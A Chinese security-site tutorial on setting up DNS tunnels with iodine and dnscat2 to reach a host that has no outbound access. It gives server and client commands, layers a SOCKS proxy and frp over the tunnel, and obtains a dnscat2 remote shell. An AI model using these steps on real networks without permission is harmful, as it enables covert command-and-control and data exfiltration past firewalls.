---
title: 一文学会DNS隧道搭建
url: https://www.freebuf.com/sectool/350589.html
source: FreeBuf网络安全行业门户
date: 2022-12-06
fetch_date: 2025-10-04T00:34:43.289384
---

# 一文学会DNS隧道搭建

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

一文学会DNS隧道搭建

* ![]()
* 关注

* [工具](https://www.freebuf.com/articles/sectool)

一文学会DNS隧道搭建

2022-12-05 15:03:13

所属地 陕西省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 一.DNS隧道准备

和我哥们在看一个站点的时候，发现是不出网的，但是站点可以做DNS查询，所以想着搭建一个DNS隧道。

**此篇文章为了读者看起来更加清楚，我的公网服务器与域名都是未打码的，希望各位大佬手下留情。**

### **1.DNS隧道介绍**

DNS隧道，是隧道技术中的一种。当我们的HTTP、HTTPS这样的上层协议、正反向端口转发都失败的时候，可以尝试使用DNS隧道。DNS隧道很难防范，因为平时的业务也好，使用也罢，难免会用到DNS协议进行解析，所以防火墙大多对DNS的流量是放行状态。这时候，如果我们在不出网机器构造一个恶意的域名（\*\*\*.xxx.ga），本地的DNS服务器无法给出回答时，就会以迭代查询的方式通过互联网定位到所查询域的权威DNS服务器。最后，这条DNS请求会落到我们提前搭建好的恶意DNS服务器上，于是乎，我们的不出网主机就和恶意DNS服务器交流上了。

**搭建DNS隧道的工具目前有iodine，dnscat，dns2tcp等**。

我目前使用的是iodine工具去搭建。

### 2.前期准备

**1个域名，1个公网服务器**

需要申请一个域名(最好匿名的，推荐申请网站<http://www.freenom.com/zh/index.html>），免费且匿名的。

申请的时候直接带上后缀申请，不然会显示域名不可用(例如:jingbao123.ga)。

![image-20221112102042170.png](https://image.3001.net/images/20221123/1669193875_637de0936c4074bee0a09.png!small)

申请好之后推荐将freenom的域名服务器更改为腾讯dnspod的，更方面管理域名并且可以配置NS解析，freenom我没找到NS记录。

dnspod：https://www.dnspod.cn，在dnspod中添加刚申请的域名，然后dnspod会给出两条dns服务器地址，![image-20221112101425317.png](https://image.3001.net/images/20221123/1669193876_637de09476d13402d1361.png!small)

将freenom中dns服务器更改为dnspod提供的地址，就可以将域名的解析权给引到dnspod。

![image-20221112101828515.png](https://image.3001.net/images/20221123/1669193877_637de0957cd2f9661ac8f.png!small)

dnspod得到域名的管理权之后，在里面添加两条解析记录。

![image-20221112102529262.png](https://image.3001.net/images/20221123/1669193878_637de0968d39391d319af.png!small)

第一条A类记录，告诉域名系统，"www.woshishui120.ga"的IP地址是"121.xxx.xxx.xxx"

第二条NS记录，告诉域名系统，"ns.woshishui120.ga"的域名由"www.woshishui120.ga"进行解析。

到此前期准备工作就已经完成了，已经将域名绑定到了我们的公网服务器上。

## 二.iodine DNS隧道搭建

在我们的公网服务器安装iodine，该工具服务端为iodined，客户端为iodine。

执行apt install iodine命令会同时安装服务端与客户端。

### **1.服务端**

在公网服务器上部署iodine服务端。(需要root权限运行)

`iodined -f -c -P 123.com 192.168.200.1 ns.woshishui120.ga -DD`

* `\-f：在前台运行`
* `\-c：禁止检查所有传入请求的客户端IP地址。`
* `\-P：客户端和服务端之间用于验证身份的密码。`
* `\-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。`

`这里的192.168.200.1为自定义局域网虚拟IP地址，建议不要与现有网段冲突`
`注意！填写的地址为NS记录`

![image-20221112103259591.png](https://image.3001.net/images/20221123/1669193879_637de09769dc8600655a5.png!small)

执行完该命令之后会新生成一个dns0虚拟网卡，ip地址就是刚才命令中输入的ip地址(192.168.200.1)。

![image-20221112105106479.png](https://image.3001.net/images/20221123/1669193880_637de0983c48b54a5adfa.png!small)

**`**ubuntu默认53端口是打开的，通过下面命令关闭掉53端口**`**

`rm /etc/resolv.conf&&echo "nameserver x.x.x.x" >> /etc/resolv.conf 配置dns服务器(x.x.x.x改为dns服务器,8.8.8.8等)`

`systemctl stop systemd-resolved 停止该进程`

`systemctl disable systemd-resolved 关闭开机自启动`

### 2.**客户端**

客户端我使用的kali，kali自带iodine工具。

`iodine -f -P 123.com ns.woshishui120.ga -M 200`

* `-r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道`
* `-M：指定上行主机的大小。`
* `-m：调节最大下行分片的大小。`
* `-f：在前台运行`
* `-T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。`
* `-O：指定数据编码规范。`
* `-P：客户端和服务端之间用于验证身份的密码。`
* `-L：指定是否开启懒惰模式，默认开启。`
* `-I：指定两个请求之间的时间间隔。`

![image-20221112103813903.png](https://image.3001.net/images/20221123/1669193881_637de0992ada2d5ac6790.png!small)

### 3.坑点

我客户端执行连接命令之后，死活连接不到(如上图所示)，刚开始我以为我的ns记录未生效，但是中午配置的下午我试还是不行。我又认为是腾讯云的缘故，53端口不可用等，但是各位大佬说53端口是可用的，于是就求助各位大佬。最终大佬给的这篇文章有了答案。https://exploit0.cn/archives/571/

我的公网服务器是腾讯云的，我当时只在防火墙管理面板打开了tcp53端口，但是没有打开udp53端口。dns解析使用的是udp53端口。

![image-20221112104637932.png](https://image.3001.net/images/20221123/1669193882_637de09a042d23290f639.png!small)

于是我快速的打开了腾讯云防火墙的udp53端口。

![image-20221112104911838.png](https://image.3001.net/images/20221123/1669193882_637de09aa365baaefc41c.png!small)

然后继续执行上述命令。

![image-20221112105503090.png](https://image.3001.net/images/20221123/1669193883_637de09b99349cdd6de9c.png!small)

可以看到已经连接成功。但是会报编码错误，经过大佬指示该工具也可以指定编码。参数为-O

`iodine -f -P 123.com ns.woshishui120.ga -M 200 -O base64`

![image-20221112105752298.png](https://image.3001.net/images/20221123/1669193884_637de09cb5c95df54e02b.png!small)

虽然也会出现编码错误，但是比刚才明显少了很多。

连接成功之后，kali上也会生成一个虚拟网卡。ip地址被分配为192.168.200.2。

![image-20221112105912648.png](https://image.3001.net/images/20221123/1669193886_637de09e44f935064ef0e.png!small)

在kali上ping一下公网服务器的虚拟地址，可以ping通，说明DNS隧道已经搭建成功了。

![image-20221112110007499.png](https://image.3001.net/images/20221123/1669193887_637de09f3bbefb7eedbe7.png!small)

现在就相当于在公网服务器和kail之间各生成了一个虚拟网卡，然后这两个虚拟网卡之间是互通的，

![image-20221112120024457.png](https://image.3001.net/images/20221123/1669193888_637de0a028d2ee12b4ca7.png!small)

在公网服务器上连接kali的虚拟地址，使用ssh做一个动态端口转发。

`ssh -D 60688 root@192.168.200.2`

![image-20221112111552969.png](https://image.3001.net/images/20221123/1669193888_637de0a0ef9f966f3dcf5.png!small)

但此时只相当于在公网服务器的192.168.200.1的60688端口搭建了一个socks5代理隧道，如果想要本地使用该隧道是行不通的，因为192.168.200.1相当于一个内网地址，是不能直接访问得到的，所以需要将公网服务器虚拟网卡地址192.168.200.1的60688端口数据转发到公网服务器公网地址的一个端口上。这个端口转发我还没试(不知道采用哪个工具会好点)。

我用的是frp在两个虚拟网卡之间搭建一个反向隧道。

### 4.frp搭建隧道

在公网服务器开启服务端。

![image-20221112114418465.png](https://image.3001.net/images/20221123/1669193889_637de0a1aaf31caebed01.png!small)

![image-20221112114029740.png](https://image.3001.net/images/20221123/1669193890_637de0a27f87778f62762.png!small)

然后使用kali去连接，kali连接的服务端ip为公网服务器虚拟网卡的ip。

![image-20221112114142210.png](https://image.3001.net/images/20221123/1669193891_637de0a33917f81a130b3.png!small)

kali显示如下

![image-20221112114312931.png](https://image.3001.net/images/20221123/1669193892_637de0a4375a10cf46efb.png!small)

公网服务器显示如下

![image-20221112114222034.png](https://image.3001.net/images/20221123/1669193893_637de0a5370b2a7d4dfb6.png!small)

即成功在公网服务器的60688端口搭建了一个socks5隧道，相当于socks5隧道套接在dns隧道里面。

![image-20221112115021530.png](https://image.3001.net/images/20221123/1669193894_637de0a61decd6d7078e0.png!small)

然后就可以通过公网服务器的60688端口去遨游kali的内网。(但是感觉很卡)

## 三.dnscat2 DNS隧道搭建

### (1)直连模式

**客户端直接向指定IP地址的DNS服务器发起DNS解析请求**

**1.服务端**

公网服务器做服务端

`ruby dnscat2.rb`

![image-20221112123719142.png](https://image.3001.net/images/20221123/1669193894_637de0a6e27e1b9091ed0.png!small)

**2.客户端**

`dnscat --dns server=121.5.145.31,port=53 --secret=4575d232b01034db7eae9baa9ac4dbe2`

kali做客户端：命令为服务端输出的命令(上图红色圈出的地方，x.x.x.x更改为自己公网服务器地址)

![image-20221112123631410.png](https://image.3001.net/images/20221123/1669193896_637de0a8305cfe4092f1b.png!small)

不知道为什么直连模式下kali连接不到服务端(有大佬知道的可以告知下)

### (2)中继模式

**DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢**

**1.服务端**

公网服务器作为服务端

`ruby dnscat2.rb ns.woshishui120.ga -e open --no-cache -c 123.com`

`-e：指定安全级别，open表示服务端运行客户端不进行加密`

`-c：指定密钥`

`--no-cache：禁止缓存，一定添加该选项，因为powershell-dnscat2客户端域dnscat2服务端的Caching模式不兼容`

![image-20221112121751503.png](https://image.3001.net/images/20221123/1669193897_637de0a927661134af3d4.png!small)

**2.客户端**

kali作为客户端

`dnscat --secret=123.com ns.woshishui120.ga`

![image-20221112121146478.png](https://image.3001.net/images/20221123/1669193898_637de0aa138ef3c317125.png!small)

使用dnscat2搭建dns隧道，搭建成功之后，会在服务端生成一个session，

![image-20221112122143221.png](https://image.3001.net/images/20221123/1669193899_637de0ab0449b434a56be.png!small)

进入session 2执行shell之后会生成一个新session，

![image-20221112124010460.png](https://image.3001.net/images/20221123/1669193899_637de0abd16628b3e668b.png!small)

该新session可以执行命令。

![image-20221112122353541.png](https://image.3001.net/images/20221123/1669193900_63...